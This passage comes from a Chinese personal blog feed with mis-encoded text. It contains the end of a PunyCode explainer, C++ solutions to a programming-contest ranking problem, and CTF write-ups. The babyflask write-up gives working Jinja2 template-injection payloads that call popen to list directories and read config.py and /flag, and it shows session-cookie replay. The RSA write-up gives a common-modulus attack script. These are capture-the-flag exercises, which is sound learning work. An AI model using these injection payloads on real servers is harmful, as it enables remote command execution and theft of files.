ASCIIå­—ç¬¦è¡¨ç¤ºçš„åŸŸåï¼Œæ‰€ä»¥è¦å¯¹Unicodeåºåˆ—è¿›è¡Œ ACE(ASCII-compatible encoding)ç¼–ç ï¼ŒæŠŠ Unicodeåºåˆ—è¡¨ç¤ºçš„åŸŸåè½¬æ¢æˆ ASCII å­—ç¬¦ä¸²è¡¨ç¤ºçš„ACEåŸŸåã€‚<br>2ã€PunyCodeæ˜¯ä¸€ç§ä¸“ä¸ºå›½é™…åŒ–åŸŸåè€Œè®¾è®¡çš„é«˜æ•ˆACEç¼–ç æ–¹å¼ã€‚å®ƒå¯ä»¥åœ¨Unicodeåºåˆ—å’ŒASCII å­—ç¬¦ä¸²ä¹‹é—´è¿›è¡Œå”¯ä¸€çš„å’Œå¯é€†çš„è½¬æ¢ã€‚è½¬æ¢çš„è¿‡ç¨‹ä¸­ï¼ŒUnicode åºåˆ—ä¸­çš„ASCIIå­—ç¬¦ä¿æŒä¸å˜ï¼Œå›½é™…åŒ–å­—ç¬¦åˆ™ç”¨å­—æ¯å’Œæ•°å­—æ¥è¡¨ç¤ºã€‚å®ƒçš„å®è´¨æ˜¯ä¸€ç§ç”¨æ•°é‡æœ‰é™çš„åŸºæœ¬å­—ç¬¦(å­—æ¯å’Œæ•°å­—)æ¥å”¯ä¸€åœ°è¡¨ç¤ºå¤§å­—ç¬¦é›†(Unicode)ä¸­çš„å­—ç¬¦çš„é€šç”¨ç®—æ³•ã€‚åŸŸåä¸­çš„å­—ç¬¦ï¼ŒåŒ…æ‹¬ ASCII ç å’Œ Unicode ç ï¼Œéƒ½æ˜¯ä½œä¸ºæ•´æ•°è¿›è¡Œå¤„ç†ã€‚<br>PunyCodeåˆ™æ˜¯å°†ä¸€ä¸ªç»è¿‡Nameprepå¤„ç†è¿‡çš„IDNï¼Œä»ä¸€ä¸ª8ä½çš„ç¼–ç çš„å½¢å¼è½¬æ¢ä¸º7ä½ç¼–ç çš„å½¢å¼ã€‚ç›®å‰Internet DNSä¸€å‘æ˜¯7ä½ASCIIç¼–ç çš„ç¯å¢ƒï¼Œç»è¿‡è¿™ä¸ªPunyCodeè½¬ç ç¨‹åºï¼Œä¾¿å°†IDNä»ä¸€ä¸ª8ä½çš„IDNè½¬æ¢ä¸ºä¸ç°æœ‰DNSç¯å¢ƒå…¼å®¹çš„ç¼–ç ã€‚<br>3ã€åœ¨DNSæœåŠ¡å™¨æ–¹é¢ï¼Œéœ€è¦å°†IDNä»¥PunyCodeçš„ç¼–ç å½¢å¼æ¥è®¾å®šã€‚å› ä¸ºPunyCodeæœ¬èº«å°±æ˜¯ä¸€ç§7ä½çš„ç¼–ç ï¼Œä¸ASCIIç¼–ç å®Œå…¨å…¼å®¹ï¼Œæ‰€ä»¥å¯é€‚ç”¨è®¾å®šäºç›®å‰æ‰€æœ‰å¯ç”¨çš„DNSç‰ˆæœ¬,ä¹Ÿå°±æ˜¯è¯´å¯ä»¥ä¸éœ€è¦ä¸ºäº†è®¾å®šPunyCodeè€Œé‡æ–°å®‰è£…BINDæ–°ç‰ˆæœ¬ã€‚ä½†æ˜¯è‹¥æ˜¯éœ€è¦ä½¿ç”¨DNAMEæŒ‡ä»¤æ¥è®¾å®šèµ„æºè®°å½•(Resource Record)ï¼Œåˆ™éœ€å…ˆæå‡ä¸ºBIND9çš„ç‰ˆæœ¬ã€‚</p>
<link rel="stylesheet" href="/css/spoiler.css" type="text/css"><script src="/js/spoiler.js" type="text/javascript" async></script>]]></content>
      <categories>
        <category>Hexo</category>
      </categories>
      <tags>
        <tag>Hexo</tag>
        <tag>Github</tag>
      </tags>
  </entry>
  <entry>
    <title>L2-3.åäººå ‚ä¸ä»£é‡‘åˆ¸</title>
    <url>/posts/45393/</url>
    <content><![CDATA[<h2 id="é¢˜ç›®å†…å®¹"><a href="#é¢˜ç›®å†…å®¹" class="headerlink" title="é¢˜ç›®å†…å®¹"></a>é¢˜ç›®å†…å®¹</h2><p>å¯¹äºåœ¨ä¸­å›½å¤§å­¦MOOC(<a href="http://www.icourse163.org/">http://www.icourse163.org/</a>) å­¦ä¹ â€œæ•°æ®ç»“æ„â€è¯¾ç¨‹çš„å­¦ç”Ÿï¼Œæƒ³è¦è·å¾—ä¸€å¼ åˆæ ¼è¯ä¹¦ï¼Œæ€»è¯„æˆç»©å¿…é¡»è¾¾åˆ° 60 åˆ†åŠä»¥ä¸Šï¼Œå¹¶ä¸”æœ‰å¦åŠ ç¦åˆ©ï¼šæ€»è¯„åˆ†åœ¨ [G, 100] åŒºé—´å†…è€…ï¼Œå¯ä»¥å¾—åˆ° 50 å…ƒ PAT ä»£é‡‘åˆ¸ï¼›åœ¨ [60, G) åŒºé—´å†…è€…ï¼Œå¯ä»¥å¾—åˆ° 20 å…ƒPATä»£é‡‘åˆ¸ã€‚å…¨å›½è€ƒç‚¹é€šç”¨ï¼Œä¸€å¹´æœ‰æ•ˆã€‚åŒæ—¶ä»»è¯¾è€å¸ˆè¿˜ä¼šæŠŠæ€»è¯„æˆç»©å‰ K åçš„å­¦ç”Ÿåˆ—å…¥è¯¾ç¨‹â€œåäººå ‚â€ã€‚æœ¬é¢˜å°±è¯·ä½ ç¼–å†™ç¨‹åºï¼Œå¸®åŠ©è€å¸ˆåˆ—å‡ºåäººå ‚çš„å­¦ç”Ÿï¼Œå¹¶ç»Ÿè®¡ä¸€å…±å‘å‡ºäº†é¢å€¼å¤šå°‘å…ƒçš„ PAT ä»£é‡‘åˆ¸ã€‚</p>
<span id="more"></span>
<h2 id="è¾“å…¥æ ¼å¼"><a href="#è¾“å…¥æ ¼å¼" class="headerlink" title="è¾“å…¥æ ¼å¼"></a>è¾“å…¥æ ¼å¼</h2><p>è¾“å…¥åœ¨ç¬¬ä¸€è¡Œç»™å‡º 3 ä¸ªæ•´æ•°ï¼Œåˆ†åˆ«æ˜¯ Nï¼ˆä¸è¶…è¿‡ 10 000 çš„æ­£æ•´æ•°ï¼Œä¸ºå­¦ç”Ÿæ€»æ•°ï¼‰ã€Gï¼ˆåœ¨ (60,100) åŒºé—´å†…çš„æ•´æ•°ï¼Œä¸ºé¢˜é¢ä¸­æè¿°çš„ä»£é‡‘åˆ¸ç­‰çº§åˆ†ç•Œçº¿ï¼‰ã€Kï¼ˆä¸è¶…è¿‡ 100 ä¸”ä¸è¶…è¿‡ N çš„æ­£æ•´æ•°ï¼Œä¸ºè¿›å…¥åäººå ‚çš„æœ€ä½åæ¬¡ï¼‰ã€‚æ¥ä¸‹æ¥ N è¡Œï¼Œæ¯è¡Œç»™å‡ºä¸€ä½å­¦ç”Ÿçš„è´¦å·ï¼ˆé•¿åº¦ä¸è¶…è¿‡15ä½ã€ä¸å¸¦ç©ºæ ¼çš„å­—ç¬¦ä¸²ï¼‰å’Œæ€»è¯„æˆç»©ï¼ˆåŒºé—´ [0, 100] å†…çš„æ•´æ•°ï¼‰ï¼Œå…¶é—´ä»¥ç©ºæ ¼åˆ†éš”ã€‚é¢˜ç›®ä¿è¯æ²¡æœ‰é‡å¤çš„è´¦å·ã€‚ </p>
<h2 id="è¾“å‡ºæ ¼å¼"><a href="#è¾“å‡ºæ ¼å¼" class="headerlink" title="è¾“å‡ºæ ¼å¼"></a>è¾“å‡ºæ ¼å¼</h2><p>é¦–å…ˆåœ¨ä¸€è¡Œä¸­è¾“å‡ºå‘å‡ºçš„ PAT ä»£é‡‘åˆ¸çš„æ€»é¢å€¼ã€‚ç„¶åæŒ‰æ€»è¯„æˆç»©éå‡åºè¾“å‡ºè¿›å…¥åäººå ‚çš„å­¦ç”Ÿçš„åæ¬¡ã€è´¦å·å’Œæˆç»©ï¼Œå…¶é—´ä»¥ 1 ä¸ªç©ºæ ¼åˆ†éš”ã€‚éœ€è¦æ³¨æ„çš„æ˜¯ï¼šæˆç»©ç›¸åŒçš„å­¦ç”Ÿäº«æœ‰å¹¶åˆ—çš„æ’åï¼Œæ’åå¹¶åˆ—æ—¶ï¼ŒæŒ‰è´¦å·çš„å­—æ¯åºå‡åºè¾“å‡ºã€‚</p>
<h2 id="è¾“å…¥æ ·ä¾‹"><a href="#è¾“å…¥æ ·ä¾‹" class="headerlink" title="è¾“å…¥æ ·ä¾‹"></a>è¾“å…¥æ ·ä¾‹</h2><div class="note default no-icon"><p>
10 80 5
cy@zju.edu.cn 78
cy@pat-edu.com 87
1001@qq.com 65
uh-oh@163.com 96
test@126.com 39
anyone@qq.com 87
zoe@mit.edu 80
jack@ucla.edu 88
bob@cmu.edu 80
ken@163.com 70
</p></div>

<h2 id="è¾“å‡ºæ ·ä¾‹"><a href="#è¾“å‡ºæ ·ä¾‹" class="headerlink" title="è¾“å‡ºæ ·ä¾‹"></a>è¾“å‡ºæ ·ä¾‹</h2><div class="note default no-icon"><p>
360
1 uh-oh@163.com 96
2 jack@ucla.edu 88
3 anyone@qq.com 87
3 cy@pat-edu.com 87
5 bob@cmu.edu 80
5 zoe@mit.edu 80
</p></div>

<p><strong>æ—¶é—´é™åˆ¶ï¼š150mså†…å­˜é™åˆ¶ï¼š65536kb</strong></p>
<h2 id="ä»£ç "><a href="#ä»£ç " class="headerlink" title="ä»£ç "></a>ä»£ç </h2><h3 id="è§£æ³•ä¸€"><a href="#è§£æ³•ä¸€" class="headerlink" title="è§£æ³•ä¸€"></a>è§£æ³•ä¸€</h3><p>ç”¨ä¸€ä¸ªç»“æ„ä½“æ¥å­˜å§“åå’Œæˆç»©ï¼Œå†ç”¨è‡ªå®šä¹‰çš„æ¯”è¾ƒå‡½æ•°sortä¸€ä¸‹ã€‚</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="type">long</span> <span class="type">long</span> ll;</span><br><span class="line"></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">stu</span></span><br><span class="line">&#123;</span><br><span class="line">    string name;</span><br><span class="line">    <span class="type">int</span> grade;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="function"><span class="type">bool</span> <span class="title">cmp</span><span class="params">(<span class="type">const</span> stu&amp; s1, <span class="type">const</span> stu&amp; s2)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(s<span class="number">1.</span>grade != s<span class="number">2.</span>grade)</span><br><span class="line">        <span class="keyword">return</span> s<span class="number">1.</span>grade &gt; s<span class="number">2.</span>grade;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        <span class="keyword">return</span> s<span class="number">1.</span>name &lt; s<span class="number">2.</span>name;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">//freopen(&quot;in.txt&quot;, &quot;r&quot;, stdin);</span></span><br><span class="line">    <span class="comment">//freopen(&quot;out.txt&quot;, &quot;w&quot;, stdout);</span></span><br><span class="line">    cin.<span class="built_in">sync_with_stdio</span>(<span class="literal">false</span>);</span><br><span class="line">    <span class="type">int</span> n, g, k;</span><br><span class="line">    cin &gt;&gt; n &gt;&gt; g &gt;&gt; k;</span><br><span class="line">    vector&lt;stu&gt; v;</span><br><span class="line">    ll ans = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; n; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        string temp1;</span><br><span class="line">        <span class="type">int</span> temp2;</span><br><span class="line">        cin &gt;&gt; temp1 &gt;&gt; temp2;</span><br><span class="line">        stu temp;</span><br><span class="line">        temp.name = temp1;</span><br><span class="line">        temp.grade = temp2;</span><br><span class="line">        v.<span class="built_in">push_back</span>(temp);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(temp2 &gt;= <span class="number">60</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span>(temp2 &lt; g)</span><br><span class="line">                ans += <span class="number">20</span>;</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">                ans += <span class="number">50</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    cout &lt;&lt; ans &lt;&lt; endl;</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> index = <span class="number">1</span>;</span><br><span class="line">    <span class="type">int</span> number = <span class="number">1</span>;</span><br><span class="line">    <span class="built_in">sort</span>(v.<span class="built_in">begin</span>(), v.<span class="built_in">end</span>(), cmp);</span><br><span class="line">    vector&lt;stu&gt;::iterator t;</span><br><span class="line">    ll flag = v[<span class="number">0</span>].grade;</span><br><span class="line">    <span class="keyword">for</span>(t = v.<span class="built_in">begin</span>(); t != v.<span class="built_in">end</span>(); t++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span>(flag != (*t).grade)</span><br><span class="line">        &#123;</span><br><span class="line">            flag = (*t).grade;</span><br><span class="line">            index = number;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(index &gt; k)</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        cout &lt;&lt; index &lt;&lt; <span class="string">&quot; &quot;</span> &lt;&lt; (*t).name &lt;&lt; <span class="string">&quot; &quot;</span> &lt;&lt; (*t).grade &lt;&lt; endl;</span><br><span class="line">        number++;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="è§£æ³•äºŒ"><a href="#è§£æ³•äºŒ" class="headerlink" title="è§£æ³•äºŒ"></a>è§£æ³•äºŒ</h3><p>ç”¨ä¸€ä¸ªmap&lt;string,name&gt;æ¥å­˜nameå’Œgrade,å°†mapè½¬å­˜åˆ°vcetoråˆ°ä¸­è¿›è¡Œæ’åºã€‚<br>æ¯”èµ›çš„æ—¶å€™å¥½è ¢å¥½è ¢çš„åšæ³•ï¼Œåé¢ä¼šè¯´ã€‚</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="type">long</span> <span class="type">long</span> ll;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">bool</span> <span class="title">cmp</span> <span class="params">(<span class="type">const</span> pair&lt;string,<span class="type">int</span>&gt;&amp; a,<span class="type">const</span> pair&lt;string,<span class="type">int</span>&gt;&amp; b)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(a.second!=b.second)</span><br><span class="line">        <span class="keyword">return</span> a.second&gt;b.second;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        <span class="keyword">return</span> a.first&lt;b.first;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">//freopen(&quot;in.txt&quot;, &quot;r&quot;, stdin);</span></span><br><span class="line">    <span class="comment">//freopen(&quot;out.txt&quot;, &quot;w&quot;, stdout);</span></span><br><span class="line">    cin.<span class="built_in">sync_with_stdio</span>(<span class="literal">false</span>);</span><br><span class="line">    <span class="type">int</span> n,g,k;</span><br><span class="line">    cin&gt;&gt;n&gt;&gt;g&gt;&gt;k;</span><br><span class="line">    map&lt;string,<span class="type">int</span>&gt; m;</span><br><span class="line">    ll ans=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;n;i++)</span><br><span class="line">    &#123;</span><br><span class="line">        string temp1;</span><br><span class="line">        <span class="type">int</span> temp2;</span><br><span class="line">        cin&gt;&gt;temp1&gt;&gt;temp2;</span><br><span class="line">        m.<span class="built_in">insert</span>(<span class="built_in">pair</span>&lt;string,<span class="type">int</span>&gt;(temp1,temp2));</span><br><span class="line">        <span class="keyword">if</span>(temp2&gt;=<span class="number">60</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span>(temp2&lt;g)</span><br><span class="line">                ans+=<span class="number">20</span>;</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">                ans+=<span class="number">50</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    cout&lt;&lt;ans&lt;&lt;endl;</span><br><span class="line"></span><br><span class="line">    vector&lt;pair&lt;string,<span class="type">int</span>&gt;&gt; <span class="built_in">mm</span>(m.<span class="built_in">begin</span>(),m.<span class="built_in">end</span>());<span class="comment">//mapè½¬å­˜è‡³vector</span></span><br><span class="line">    <span class="built_in">sort</span>(mm.<span class="built_in">begin</span>(),mm.<span class="built_in">end</span>(),cmp);</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> index=<span class="number">1</span>;</span><br><span class="line">    <span class="type">int</span> number=<span class="number">1</span>;</span><br><span class="line">    vector&lt;pair&lt;string,<span class="type">int</span>&gt;&gt;::iterator t=mm.<span class="built_in">begin</span>();</span><br><span class="line">    ll flag=(*t).second;</span><br><span class="line">    <span class="keyword">for</span>(t=mm.<span class="built_in">begin</span>();t!=mm.<span class="built_in">end</span>();t++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span>(flag!=(*t).second)</span><br><span class="line">        &#123;</span><br><span class="line">            flag=(*t).second;</span><br><span class="line">            index=number;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(index&gt;k)</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        cout&lt;&lt;index&lt;&lt;<span class="string">&quot; &quot;</span>&lt;&lt;(*t).first&lt;&lt;<span class="string">&quot; &quot;</span>&lt;&lt;(*t).second&lt;&lt;endl;</span><br><span class="line">        number++;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h2><p>æ¯”èµ›çš„æ—¶å€™æ²¡çœ‹æ¸…é¢˜æ„ï¼Œä¸Šæ¥å°±ç›´æ¥ä¸€ä¸ªmapï¼Œå¿«å†™å®Œäº†çš„æ—¶å€™æ‰å‘ç°ä¸å¯¹ï¼Œç„¶åå°±çªå‘å¥‡æƒ³çš„å¯¹mapè¿›è¡Œsortï¼Œä½†æ˜¯ç¼–è¯‘çš„æ—¶å€™æ¯”è¾ƒå‡½æ•°é‚£ä¸€è¡Œä¸€ç›´æŠ¥é”™ã€‚æˆ‘åˆ°ç°åœ¨éƒ½ä¸æ¸…æ¥šä¸ºä»€ä¹ˆæ¯”èµ›çš„æ—¶å€™è¦ä¸€ç›´æ­»ç£•å¯¹mapæŒ‰ç…§valueè¿›è¡Œsortï¼Œå°±æ˜¯æ‡’å¾—æ”¹æˆç»“æ„ä½“åŠ vectorï¼Œç»“æœç›´åˆ°æ¯”èµ›ç»“æŸå‰å‡ åˆ†é’Ÿæ‰å¼€å§‹æ”¹ï¼Œè™½ç„¶æ”¹å®Œäº†å¯æƒœæ²¡æ—¶é—´äº¤äº†ã€‚<br>å›åˆ°å®¿èˆç»ˆäºåœ¨ç½‘ä¸Šæ‰¾åˆ°äº†å¯¹mapè¿›è¡Œsortçš„æ–¹æ³•ï¼šå°†mapè½¬å­˜è‡³vectorä¸­ï¼Œç„¶åsortã€‚<code>vector&lt;pair&lt;string,int&gt;&gt; mm(m.begin(),m.end());</code>ä½†æ˜¯è¿˜æ˜¯ç”¨ç»“æ„ä½“åŠ vectoræ–¹ä¾¿å•Šã€‚<br>è¿˜æ˜¯è‡ªå·±èœå•Š.......</p>
<div class="note warning"><p>
æ³¨æ„ï¼šSTLåº“ä¸­çš„sortå‡½æ•°åªèƒ½å¯¹çº¿æ€§å­˜å‚¨çš„å¯¹è±¡è¿›è¡Œæ’åº,å¦‚:vectorã€arrayã€listã€deque,ä¸èƒ½å¯¹é›†åˆå®¹å™¨è¿›è¡Œæ’åº,å¦‚:setã€map;
</p></div>

<p>å‚è€ƒåšå®¢:<a href="https://blog.csdn.net/iicy266/article/details/11906189">C++ STLä¸­Mapçš„æŒ‰Keyæ’åºå’ŒæŒ‰Valueæ’åº</a></p>
<link rel="stylesheet" href="/css/spoiler.css" type="text/css"><script src="/js/spoiler.js" type="text/javascript" async></script>]]></content>
      <categories>
        <category>ACM</category>
      </categories>
      <tags>
        <tag>ACM</tag>
        <tag>CCCCå¤©æ¢¯èµ›</tag>
      </tags>
  </entry>
  <entry>
    <title>L3HCTF2021-ä¸ªäººèƒ½åŠ›è®¤è¯ Writeup</title>
    <url>/posts/98571386/</url>
    <content><![CDATA[<h1 id="babyflask"><a href="#babyflask" class="headerlink" title="babyflask"></a>babyflask</h1><p><em><a href="http://123.60.19.253:10001/">http://123.60.19.253:10001</a></em></p>
<hr>
<p>åˆ†æç»™å‡ºçš„æºæ–‡ä»¶,å‘ç°<code>/success</code>è·¯ç”±ä¸‹çš„<code>name</code>å­˜åœ¨SSTIæ¼æ´.</p>
<p>ç»§ç»­åˆ†æ,<code>name</code>å–è‡ª<code>session[&#39;name&#39;]</code>,ç”¨æˆ·ç™»å½•æ—¶ä¼šè‡ªåŠ¨åˆ›æ–°ç”¨æˆ·å’Œåˆ é™¤å‰ä¸€ä¸ªåŒåç”¨æˆ·çš„ç™»å½•ä¿¡æ¯,é‚£å…¶å®æˆ‘ä»¬ç”¨æ³¨å…¥çš„ä»£ç çš„ä½œä¸ºç”¨æˆ·åç›´æ¥ç™»å½•å³å¯.</p>
<pre><code class="python">template =  &#39;&#39;&#39;
Congratulations, %s. You can get flag now!
&#39;&#39;&#39; % name
return render_template_string(template)
</code></pre>
<p>è¦æƒ³æ‰§è¡Œåˆ°ä¸Šè¿°ä»£ç ,éœ€è¦ç»™flagæŠ•æ»¡8ç¥¨(æˆ‘ä»¬æ‰‹é‡Œåªæœ‰5ç¥¨),æ³¨æ„åˆ°voteæ˜¯å­˜å‚¨åœ¨sessionä¸­,<code>/vote</code>æ¥å£ä¼šæ ¡éªŒ<code>session</code>ä¸­ä¿å­˜çš„voteæ•°é‡å¹¶å‡ä¸€,çŒœæµ‹è¿™é‡Œå¯èƒ½å­˜åœ¨sessionä¼šè¯åŠ«æŒ.</p>
<p>æˆ‘ä»¬ç¬¬ä¸€æ¬¡ç™»å½•æ—¶å¤åˆ¶ä¸€ä¸‹å½“å‰çš„<code>session</code>,ç„¶åç»™flagæŠ•ç¥¨,ç­‰æ‰‹é‡Œçš„ç¥¨ç”¨å…‰ä¹‹å,å†æŠŠç¬¬ä¸€æ¬¡ç™»å½•æ—¶å¤åˆ¶çš„<code>seesion</code>ç²˜è´´è¿›æµè§ˆå™¨ä¿å­˜çš„Cookieä¸­,æˆ‘ä»¬çš„ç¥¨åˆå›æ¥äº†.</p>
<blockquote>
<p>ğŸ¤ ç™»å½•åç–¯ç‹‚ç‚¹å‡»â€œæŠ•ç¥¨â€,ä¹Ÿèƒ½æŠ•æ»¡8ç¥¨;å¯èƒ½å› ä¸ºServerå“åº”å¤ªæ…¢,æµè§ˆå™¨ä¸­ä¿å­˜çš„sessionè¿˜æ²¡æ¥å¾—åŠè¢«æ›´æ–°,å¯¼è‡´å¤šä¸ªè¯·æ±‚å‘èµ·æ—¶å…±ç”¨ä¸€ä¸ªsession(å³voteæ•°é‡ç›¸ç­‰),sessionä¸­ä¿å­˜çš„voteæœ€ç»ˆåªä¼šå‡ä¸€.</p>
</blockquote>
<img data-src="../../CTF/L3HCTF2021-ä¸ªäººèƒ½åŠ›è®¤è¯/Web/images/0.jpg" alt="image-20211114190032492" style="zoom:50%;" />

<p>ä½¿ç”¨å¦‚ä¸‹ä»£ç ä½œä¸ºç”¨æˆ·åç™»å½•,æŸ¥çœ‹ä¸€ä¸‹å½“å‰å·²åŠ è½½æ¨¡å—</p>
<pre><code class="python">&#123;&#123;''.__class__.__bases__[0].__subclasses__()&#125;&#125;
</code></pre>
<img data-src="../../CTF/L3HCTF2021-ä¸ªäººèƒ½åŠ›è®¤è¯/Web/images/1.jpg" alt="image-20211114182131940" style="zoom:50%;" />

<p>äººè‚‰è®¡æ•°&#x2F;å†™ä¸ªè„šæœ¬,æ‰¾åˆ°<code>os._wrap_close</code>æ¨¡å—æ‰€åœ¨çš„ç´¢å¼•,å€ŸåŠ©äº<code>popen</code>å‡½æ•°å¯ä»¥ç›´æ¥æ‰§è¡Œç³»ç»Ÿå‘½ä»¤</p>
<pre><code class="python">num = 0
for i in a.split(&#39;, &#39;):
    if &#39;os._wrap_close&#39; in i:
        print(num)
    num += 1
</code></pre>
<p>å…ˆ<code>ls -a</code>ä¸€ä¸‹,å‘ç°<code>config.py</code></p>
<pre><code class="python">&#123;&#123;''.__class__.__bases__[0].__subclasses__()[132].__init__.__globals__['popen']('ls -a').read()&#125;&#125;
</code></pre>
<p><img data-src="/../../CTF/L3HCTF2021-%E4%B8%AA%E4%BA%BA%E8%83%BD%E5%8A%9B%E8%AE%A4%E8%AF%81/Web/images/2.png" alt="image-20211114183143814"><br>ç»§ç»­<code>cat</code>,æ²¡æœ‰åœ¨<code>config.py</code>ä¸­æ‰¾åˆ°flag</p>
<pre><code class="python">&#123;&#123;''.__class__.__bases__[0].__subclasses__()[132].__init__.__globals__['popen']('cat config.py').read()&#125;&#125;
</code></pre>
<p><img data-src="/../../CTF/L3HCTF2021-%E4%B8%AA%E4%BA%BA%E8%83%BD%E5%8A%9B%E8%AE%A4%E8%AF%81/Web/images/3.png" alt="image-20211114183703433"></p>
<p>ç”¨<code>ls -R /</code>æ‰¾æ‰¾,å‘ç°å­˜åœ¨<code>/flag</code>æ–‡ä»¶</p>
<pre><code class="python">&#123;&#123;''.__class__.__bases__[0].__subclasses__()[132].__init__.__globals__['popen']('ls -R /').read()&#125;&#125;
</code></pre>
<p><img data-src="/../../CTF/L3HCTF2021-%E4%B8%AA%E4%BA%BA%E8%83%BD%E5%8A%9B%E8%AE%A4%E8%AF%81/Web/images/4.jpg" alt="image-20211114183857713"><br>ç›´æ¥<code>cat /flag</code>å³å¯</p>
<pre><code class="python">&#123;&#123;''.__class__.__bases__[0].__subclasses__()[132].__init__.__globals__['popen']('cat /flag').read()&#125;&#125;
</code></pre>
<p><img data-src="/../../CTF/L3HCTF2021-%E4%B8%AA%E4%BA%BA%E8%83%BD%E5%8A%9B%E8%AE%A4%E8%AF%81/Web/images/5.png" alt="image-20211114184236370"></p>
<p><strong>flag:</strong><code>l3hsec&#123;emmMmMM_mm~mMMmm~~T&#125;</code></p>
<link rel="stylesheet" href="/css/spoiler.css" type="text/css"><script src="/js/spoiler.js" type="text/javascript" async></script>]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>CTF</tag>
        <tag>L3HCTF</tag>
        <tag>ä¸ªäººèƒ½åŠ›è®¤è¯</tag>
      </tags>
  </entry>
  <entry>
    <title>SunshineCTF2021 Writeup</title>
    <url>/posts/1683940375/</url>
    <content><![CDATA[<h1 id="MultipleExponents"><a href="#MultipleExponents" class="headerlink" title="MultipleExponents"></a>MultipleExponents</h1><p><em>Both Alice and Bob share the same modulus, but with different exponents. If only there was some way I could recover this message that was sent to both of them.</em></p>
<hr>
<p>é¢˜ç›®ä¸­ç»™å‡ºäº†n,e1,e2,c1,c2çš„å€¼,è¿™é‡Œå¯ä»¥åˆ©ç”¨<a href="https://ctf-wiki.org/crypto/asymmetric/rsa/rsa_module_attack/#_7">RSAå…±æ¨¡æ”»å‡»</a></p>
<pre><code class="python">import gmpy2
from Crypto.Util.number import long_to_bytes

data = &#123;&#39;n&#39;: 86683300105327745365439507825347702001838360528840593828044782382505346188827666308497121206572195142485091411381691608302239467720308057846966586611038898446400292056901615985225826651071775239736355509302701234225559345175968513640372874437860580877571155199027883755959442408968543666251138423852242301639, &#39;e1&#39;: 11048796690938982746152432997911442334648615616780223415034610235310401058533076125720945559697433984697892923155680783661955179131565701195219010273246901, &#39;e2&#39;: 9324711814017970310132549903114153787960184299541815910528651555672096706340659762220635996774790303001176856753572297256560097670723015243180488972016453,
        &#39;c1&#39;: 84855521319828020020448068809384113135703375013574055636013459151984904926013060168559438932572351720988574536405041219757650609586761217385808427001020204262032305874206933548737826840501447182203920238204769775531537454607204301478815830436609423437869412027820433923450056939361510843151320837485348066171, &#39;c2&#39;: 54197787252581595971205193568331257218605603041941882795362450109513512664722304194032130716452909927265994263753090021761991044436678485565631063700887091405932490789561882081600940995910094939803525325448032287989826156888870845730794445212288211194966299181587885508098448750830074946100105532032186340554&#125;
n = data[&#39;n&#39;]
e1 = data[&#39;e1&#39;]
e2 = data[&#39;e2&#39;]
message1 = data[&#39;c1&#39;]
message2 = data[&#39;c2&#39;]

# s &amp; t
gcd, s, t = gmpy2.gcdext(e1, e2)
if s &lt; 0:
    s = -s
    message1 = gmpy2.invert(message1, n)
if t &lt; 0:
    t = -t
    message2 = gmpy2.invert(message2, n)
plain = gmpy2.powmod(message1, s, n) * gmpy2.powmod(message2, t, n) % n
print(plain)
print(long_to_bytes(plain).decode(&#39;utf-8&#39;))
</code></pre>
<p><strong>flag:</strong><code>sun&#123;d0n7_d0_m0r3_th4n_0ne_3xp0n3nt&#125;</code></p>
